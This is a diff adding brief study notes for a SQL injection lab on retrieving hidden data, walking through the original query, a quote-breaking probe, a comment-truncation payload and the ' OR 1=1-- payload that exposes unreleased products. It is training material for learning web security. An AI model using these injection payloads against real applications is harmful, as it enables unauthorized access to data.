@@ -1,0 +1,11 @@
+Lab #1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+    Target Goal:
+         Display all products both released and unreleased
+
+    Analysis:
+         
+         SELECT * FROM products WHERE category='Gifts' AND released=1 (this will search for products in the category Gifts)
+         SELECT * FROM products WHERE category=''' AND released=1 (this will give error due to the syntax of the query)
+         SELECT * FROM products WHERE category=''--' AND released=1 ( after '--' this all query is ignored)
+         SELECT * FROM products WHERE category='' OR 1=1--' AND released=1
